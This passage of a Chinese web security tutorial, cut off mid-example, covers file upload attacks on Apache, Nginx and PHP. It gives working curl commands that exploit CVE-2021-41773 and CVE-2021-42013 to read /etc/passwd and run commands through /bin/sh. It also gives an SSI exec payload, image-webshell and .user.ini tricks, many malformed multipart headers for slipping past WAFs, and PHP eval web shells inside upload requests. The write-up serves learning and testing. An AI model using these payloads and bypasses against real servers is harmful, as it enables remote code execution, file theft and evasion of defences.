+<p>再上传图片马x.jpg，访问该图片即可。</p>
+<h3 id="3-2-5-Apache-SSI-远程命令执行漏洞"><a href="#3-2-5-Apache-SSI-远程命令执行漏洞" class="headerlink" title="3.2.5 Apache SSI 远程命令执行漏洞"></a>3.2.5 Apache SSI 远程命令执行漏洞</h3><p><strong>原理</strong>：</p>
+<p>如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用。</p>
+<p><strong>操作</strong>：</p>
+<p>上传一个<code>shell.shtml</code>文件，内容为：<br>﻿﻿<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>﻿，ls命令可以列出当前目录所有文件。</p>
+<h3 id="3-2-6-Apache文件读取-命令执行漏洞"><a href="#3-2-6-Apache文件读取-命令执行漏洞" class="headerlink" title="3.2.6 Apache文件读取&amp;命令执行漏洞"></a>3.2.6 Apache文件读取&amp;命令执行漏洞</h3><p>漏洞编号：CVE-2021-41773</p>
+<p>版本：2.4.49</p>
+<p><strong>原理</strong>：</p>
+<p>在2.4.49版本中，如果设置了穿越的目录允许被访问（默认情况下是不允许的），就可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
+<p><strong>操作</strong>：</p>
+<p>cmd执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取文件：</span></span><br><span class="line">curl -v --path-as-is http://192.168.200.3:8080/一个可以访问的目录/.%2e/.%2e/.%2e/.%2e/etc/passwd  <span class="comment">#点的url编码为%2e，或者.%2e可以替换为.%%32%65</span></span><br><span class="line"><span class="comment"># 执行命令whoami：</span></span><br><span class="line">curl -v --data <span class="string">&quot;echo;whoami&quot;</span> <span class="string">&#x27;http://192.168.200.3:8080/一个可以访问的目录/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-2-7-Apache路径穿越漏洞"><a href="#3-2-7-Apache路径穿越漏洞" class="headerlink" title="3.2.7 Apache路径穿越漏洞"></a>3.2.7 Apache路径穿越漏洞</h3><p>漏洞编号：CVE-2021-42013</p>
+<p>版本：2.4.49 、 2.4.50</p>
+<p><strong>原理</strong>：</p>
+<p>由 CVE-2021-41773 修复不完整导致，攻击者可以使用路径遍历攻击将 URL 映射到类别名指令配置的目录之外的文件。</p>
+<p><strong>操作</strong>：</p>
+<p>cmd执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读取文件：</span><br><span class="line">curl -v --path-as-is http://192.168.200.3:8080/一个可访问的目录/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-3-Nginx解析漏洞"><a href="#3-3-Nginx解析漏洞" class="headerlink" title="3.3 Nginx解析漏洞"></a>3.3 Nginx解析漏洞</h2><h3 id="3-3-1-空字节代码执行漏洞"><a href="#3-3-1-空字节代码执行漏洞" class="headerlink" title="3.3.1 空字节代码执行漏洞"></a>3.3.1 空字节代码执行漏洞</h3><p>版本：0.5.x、0.6.x、 0.7 &lt;&#x3D; 0.7.65、 0.8 &lt;&#x3D; 0.8.37</p>
+<p><strong>原理</strong>：</p>
+<p>低版本Nginx在遇到%00空字节时因为与后端FastCGI处理不一致，导致末尾包含空字节%00的文件时也能被按照php后缀解析执行。攻击者可以上传图片马xxx.jpg，通过访问<code>xxx.jpg%00.php</code>来执行其中的代码。</p>
+<h3 id="3-3-2-文件名逻辑漏洞"><a href="#3-3-2-文件名逻辑漏洞" class="headerlink" title="3.3.2 文件名逻辑漏洞"></a>3.3.2 文件名逻辑漏洞</h3><p>漏洞编号：CVE-2013-4547</p>
+<p>版本：0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7</p>
+<p><strong>原理</strong>：</p>
+<p>该漏洞存在于Nginx对于PHP的配置上，如果配置不当，容易使得Nginx实现对%00等特殊字符解析出现问题，造成Nginx将特殊构造的URL交给PHP来进行处理，而Nginx则因为特殊字符的问题，无法接收含有特殊字符的URL或者是造成了在%00位置处的截断，从而造成了客户上传的文件被当作PHP代码来解析。</p>
+<p><strong>操作</strong>：</p>
+<p>图片马内容为：<code>&lt;?php phpinfo(); ?&gt;</code>。</p>
+<p>上传图片马shell.jpg，抓包拦截，将文件名重名为：shell.jpga，先用a进行占位，之后通过16进制修改为20（空格），放行。</p>
+<blockquote>
+<p>这时的文件名为 shell.jpg0x20 。</p>
+</blockquote>
+<p>访问该图片，抓包拦截，把图片名改为<code>shell.jpgaa.php</code>，把aa通过16进制修改为20（空格）和00（截断符），放行可看到phpinfo信息。</p>
+<h3 id="3-3-3-PHP-CGI解析漏洞"><a href="#3-3-3-PHP-CGI解析漏洞" class="headerlink" title="3.3.3 PHP CGI解析漏洞"></a>3.3.3 PHP CGI解析漏洞</h3><p><strong>原理</strong>：</p>
+<p>Nginx以FastCGI模式解析PHP，PHP-FPM是FastCGI的进程管理器，Nginx将请求内容按照FastCGI协议格式封装，通过TCP报文传输给PHP-FPM解析。PHP-FPM将数据还原，执行SCRIPT_FILENAME变量值指向的PHP文件。但由于默认php配置文件中cgi.fix_pathinfo参数的作用，文件不存在时会修正路径向前递归解析，因此导致访问文件时在路径后添加任意以“.php”结尾的路径名即可将该文件以php格式执行。</p>
+<p><strong>操作</strong></p>
+<p>上传shell.jpg，访问”&#x2F;shell.jpg&#x2F;1.php”。</p>
+<h3 id="3-3-4-user-ini"><a href="#3-3-4-user-ini" class="headerlink" title="3.3.4 .user.ini"></a>3.3.4 .user.ini</h3><p><strong>要求</strong>：</p>
+<ul>
+<li><p>服务器脚本语言为PHP，并且使用CGI&#x2F;FastCGI模式，php版本&gt;5.3.0</p>
+</li>
+<li><p>上传目录下要有可执行的php文件</p>
+</li>
+</ul>
+<p><strong>原理</strong>：</p>
+<p>.user.ini会影响php.ini中的配置，从而将指定的文件内容按php来解析，影响的范围为该文件所在的目录以及子目录。需要等待php.ini中的user_ini.cache_ttl设置的时间或重启Apache才能生效，且只在php5.3.0之后的版本才生效。可用于Nginx、Apache、IIS，Apache中的.htaccess文件有同样的效果（.htaccess只能用于Apache）。</p>
+<p>php.ini中有以下两行代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 用户自定义的php.ini文件的名字，默认是.user.ini</span><br><span class="line">user_ini.filename = <span class="string">&quot;.user.ini&quot;</span></span><br><span class="line">; 重新读取用户INI文件的时间间隔，默认是<span class="number">300</span>秒（<span class="number">5</span>分钟）</span><br><span class="line">user_ini.cache_ttl = <span class="number">300</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>操作</strong>：</p>
+<p>先上传一个﻿.user.ini﻿文件，这个文件的内容为<code>auto_prepend_file=xxx.jpg</code>，再上传一个图片马xxx.jpg，起到的作用相当于在可执行的php文件前插入图片马中的内容。访问上传目录中已经存在的可执行php文件即可。</p>
+<h1 id="4-编辑器漏洞"><a href="#4-编辑器漏洞" class="headerlink" title="4 编辑器漏洞"></a>4 编辑器漏洞</h1><p>编辑器也就是在线的web编辑器，比如在搭建博客后需要发布文章，那么用来发布文章的界面就是web编辑器。当然web编辑器有很多，如：UEDITOR（百度）、eWebEdit、FCKeditor、CKEditor（新版fck）、Kindeditor、DotNetTextBox、CuteEditor等等。</p>
+<blockquote>
+<p>相关资料：</p>
+<p>编辑器漏洞详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40806924/article/details/118307640">https://blog.csdn.net/qq_40806924/article/details/118307640</a></p>
+</blockquote>
+<h1 id="5-WAF绕过"><a href="#5-WAF绕过" class="headerlink" title="5 WAF绕过"></a>5 WAF绕过</h1><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： <em>WAF</em>）</p>
+<h2 id="5-1-HTTP文件上传数据包解析"><a href="#5-1-HTTP文件上传数据包解析" class="headerlink" title="5.1 HTTP文件上传数据包解析"></a>5.1 HTTP文件上传数据包解析</h2><p>文件上传实质上还是客户端的POST请求，消息主体是一些上传信息。前端上传页面需要指定 enctype 为<code>multipart/form-data</code>才能正常上传文件。</p>
+<p>正常的文件上传数据包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://www.example.com</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryyb1zYhTI38xpQxBK</span><br><span class="line"></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;city_id&quot;</span></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">1</span></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;company_id&quot;</span></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">2</span></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;chrome.png&quot;</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">PNG ... content of chrome.png ...</span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryyb1zYhTI38xpQxBK--</span></span><br></pre></td></tr></table></figure>
+
+<p>请求头中Content-Type存在以下特征：</p>
+<ul>
+<li><p><code>multipart/form-data</code>：表示该请求是一个文件上传请求。</p>
+</li>
+<li><p>存在<code>boundary</code>字符串：作用为分隔符，以区分POST数据。</p>
+</li>
+</ul>
+<p>请求体存在以下特征：</p>
+<ul>
+<li><p><code>Content-Disposition</code>：指示如何处理响应的内容以及如何呈现给用户。例如指定是否应该直接显示在浏览器中、弹出下载对话框，或者在页面内嵌显示。</p>
+</li>
+<li><p><code>name</code>：包含该字段的内容引用的 HTML 字段的名称。</p>
+</li>
+<li><p><code>filename</code>：后面是一个包含传输文件的原始名称的字符串。</p>
+</li>
+<li><p>POST请求体中的<code>boundary</code>的值就是<code>Content-Type</code>的值在最前面加了两个<code>-</code>，除了最后标识结束的<code>boundary</code>。</p>
+</li>
+<li><p>最后标识结束的<code>boundary</code>最后默认会多出两个<code>-</code>（测试时，最后一行的boundary删掉也能成功上传）。</p>
+</li>
+</ul>
+<h3 id="5-1-1-文件上传在数据包中可修改的地方"><a href="#5-1-1-文件上传在数据包中可修改的地方" class="headerlink" title="5.1.1 文件上传在数据包中可修改的地方"></a>5.1.1 文件上传在数据包中可修改的地方</h3><p><strong>Content-Disposition</strong>：一般可更改</p>
+<p><strong>name</strong>：表单参数值，不能更改</p>
+<p><strong>filename</strong>：文件名，可以更改</p>
+<p><strong>Content-Type</strong>：文件 MIME，视情况更改</p>
+<p><strong>boundary</strong>：内容划分，可以更改</p>
+<h2 id="5-2-字符变异"><a href="#5-2-字符变异" class="headerlink" title="5.2 字符变异"></a>5.2 字符变异</h2><h3 id="5-2-1-引号变换"><a href="#5-2-1-引号变换" class="headerlink" title="5.2.1 引号变换"></a>5.2.1 引号变换</h3><p>头部字段的值既可以添加单引号也可以添加双引号还可以不加引号，都不会影响上传结果。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&quot;form-data&quot;</span>; name=file_x; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=file_x; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=file_x; filename=xx.<span class="property">php</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=xx.<span class="property">php</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&#x27;file_x&#x27;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&#x27;form-data&#x27;</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以去除掉<code>filename</code>字符串中末尾的引号，也能够正常上传。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>file_x<span class="string">&quot;; filename=&#x27;xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>file_x<span class="string">&quot;; filename=&quot;</span>xx.<span class="property">php</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-2-2-大小写变换"><a href="#5-2-2-大小写变换" class="headerlink" title="5.2.2 大小写变换"></a>5.2.2 大小写变换</h3><p>对这三个固定的字符串进行大小写转换</p>
+<p>Content-Disposition  name  filename</p>
+<p>比如<code>name</code>转换成<code>Name</code>，<code>Content-Disposition</code>转换成<code>content-disposition</code>。</p>
+<h3 id="5-2-3-添加换行符"><a href="#5-2-3-添加换行符" class="headerlink" title="5.2.3 添加换行符"></a>5.2.3 添加换行符</h3><p>字段值与等号之间可以加入换行符，依然可以正常上传，下面我使用<code>[0x0a]</code>代替换行符</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&quot;form-data&quot;</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=[<span class="number">0x0a</span>]<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="string">&quot;form-data&quot;</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=[<span class="number">0x0a</span>]<span class="string">&quot;xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: &quot;</span>form-data<span class="string">&quot;; name=&quot;</span>file_x<span class="string">&quot;; filename=[0x0a]&quot;</span>xx.<span class="property">php</span><span class="string">&quot;[0x0a]</span></span><br><span class="line"><span class="string">Content-Disposition: &quot;</span>form-data<span class="string">&quot;; name=&quot;</span>file_x<span class="string">&quot;; filename=[0x0a]xx.php</span></span><br><span class="line"><span class="string">Content-Disposition: &quot;</span>form-data<span class="string">&quot;; name=&quot;</span>file_x<span class="string">&quot;; filename=[0x0a]xx.php[0x0a];</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-2-4-多个分号"><a href="#5-2-4-多个分号" class="headerlink" title="5.2.4 多个分号"></a>5.2.4 多个分号</h3><p>文件解析时，可能因为分号解析不到文件名，导致绕过。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;file_x&quot;</span>;;; filename=<span class="string">&quot;test.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-2-5-多个等号"><a href="#5-2-5-多个等号" class="headerlink" title="5.2.5 多个等号"></a>5.2.5 多个等号</h3><p>在POST的内容中使用多个等号对文件上传也没有影响。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name==<span class="string">&quot;file_x&quot;</span>; filename====<span class="string">&quot;test.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-2-6-变换Content-Disposition的值"><a href="#5-2-6-变换Content-Disposition的值" class="headerlink" title="5.2.6 变换Content-Disposition的值"></a>5.2.6 变换Content-Disposition的值</h3><p>某些WAF在解析的时候，认为<code>Content-Disposition</code>值一定是<code>form-data</code>，造成绕过。其实<code>Content-Disposition</code>可以任意变换或为空。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: fOrM-<span class="title class_">DaTA</span>; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-da+ta; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: fo    r m-dat a; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-dataxx; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;xx.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-2-7-畸形的boundary头部"><a href="#5-2-7-畸形的boundary头部" class="headerlink" title="5.2.7 畸形的boundary头部"></a>5.2.7 畸形的boundary头部</h3><p><code>boundary</code>可以变化为如下形式，且不影响上传：</p>
+<p>正常的<code>boundary</code>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure>
+
+<p>畸形的<code>boundary</code>：</p>
+<ul>
+<li><code>multipart/form-data</code>大小写可变：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: mUltiPart/<span class="title class_">ForM</span>-dATa; boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>multipart/form-data</code>与<code>boundary</code>之间可以使用空格分隔，且中间可以插入任何值：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data x boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data abcdefg boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data a\|/?!@#$%^() boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>multipart/form-data</code>与<code>boundary</code>之间可以使用逗号分隔，且中间可以插入任何值：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,x,boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,abcdefg,boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,a\|/?!@#$%^(),boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>boundary</code>之前可以直接加入任何值（PHP可行）：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data;bypass&amp;<span class="number">123</span>**&#123;|&#125;boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data bypass&amp;<span class="number">123</span>**&#123;|&#125;boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data,bypass&amp;<span class="number">123</span>**&#123;|&#125;boundary=----<span class="title class_">WebKitFormBoundarye111</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>boundary</code>末尾可以使用逗号或分号隔开插入任何值</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundarye111</span>;123abc</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundarye111</span>,123abc</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-3-顺序颠倒"><a href="#5-3-顺序颠倒" class="headerlink" title="5.3 顺序颠倒"></a>5.3 顺序颠倒</h2><h3 id="5-3-1-交换name和filename的顺序"><a href="#5-3-1-交换name和filename的顺序" class="headerlink" title="5.3.1 交换name和filename的顺序"></a>5.3.1 交换name和filename的顺序</h3><p>因为规定了<code>Content-Disposition</code>必须在最前面，所以只能交换name和filename的顺序。</p>
+<p>有的WAF可能会匹配<code>name</code>在前面，<code>filename</code>在后面，可以导致绕过。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; filename=<span class="string">&quot;xx.php&quot;</span>; name=<span class="string">&quot;file_x&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-3-2-交换Content-Disposition和Content-Type的顺序"><a href="#5-3-2-交换Content-Disposition和Content-Type的顺序" class="headerlink" title="5.3.2 交换Content-Disposition和Content-Type的顺序"></a>5.3.2 交换Content-Disposition和Content-Type的顺序</h3><p>与上述一样，Content-Disposition和Content-Type也是能够交换顺序的。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-3-3-交换不同boundary内容的顺序"><a href="#5-3-3-交换不同boundary内容的顺序" class="headerlink" title="5.3.3 交换不同boundary内容的顺序"></a>5.3.3 交换不同boundary内容的顺序</h3><p>不同boundary内容也能够交换，且不影响文件上传</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-4-数据重复"><a href="#5-4-数据重复" class="headerlink" title="5.4 数据重复"></a>5.4 数据重复</h2><h3 id="5-4-1-boundary内容重复"><a href="#5-4-1-boundary内容重复" class="headerlink" title="5.4.1 boundary内容重复"></a>5.4.1 boundary内容重复</h3><p>最后上传的文件是shell.php而非shell.jpg，但是如果取的文件名只取了第一个就会被Bypass。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); ?&gt;</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); ?&gt;</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>--</span><br></pre></td></tr></table></figure>
+
+<p>下面这样也是可以正常上传的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>--</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>;<span class="number">123</span></span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span 